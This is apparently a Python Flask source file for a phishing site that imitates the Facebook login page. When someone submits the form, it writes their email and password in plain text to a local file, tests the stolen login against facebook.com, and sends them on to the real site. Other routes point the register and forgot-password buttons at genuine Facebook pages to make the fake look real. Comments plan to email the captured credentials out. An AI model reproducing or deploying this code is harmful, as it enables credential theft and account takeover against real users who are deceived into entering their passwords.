import os
import email
from tkinter.tix import Tree
import requests
from flask import Flask, redirect, request, render_template

app = Flask(__name__, static_folder='static')
app.config['SECRET_KEY'] = '\xe0\x8d?8z\xdd\x87i}\xfc\xaa\x91\x8f\n1\x1a\xe4\xb3\xa7\xbd5\xf8\x96\xdd'

UI_PORT = os.getenv('UI_PORT')


@app.route('/', methods=['GET', 'POST'])
def main():
    if request.method == 'POST':
        emailAddress = request.form['username']
        password = request.form['password']
        f = open("passwords.txt", "a")
        f.write(emailAddress + '\t' + password + '\n')
        f.close()
        # return redirect('https://www.facebook.com/')
        response = requests.get('https://www.facebook.com/login', auth=(emailAddress, password), allow_redirects=True)
        if response.status_code == 200:
            return redirect('https://www.facebook.com/')
        # if credentials ok, send to email, then redirect to their page
        # send captured credentials to an email
        # redirect to facebook after login with credentials
    # return render_template('test_html.html')
    return render_template('overlay.html')


# legit to click on the register and forgot password buttons
@app.route('/register', methods=['GET', 'POST'])
def register():
    return redirect('https://www.facebook.com/register')

@app.route('/forgot', methods=['GET', 'POST'])
def forgot():
    return redirect('https://www.facebook.com/login/identify')


if __name__ == "__main__":
    app.run()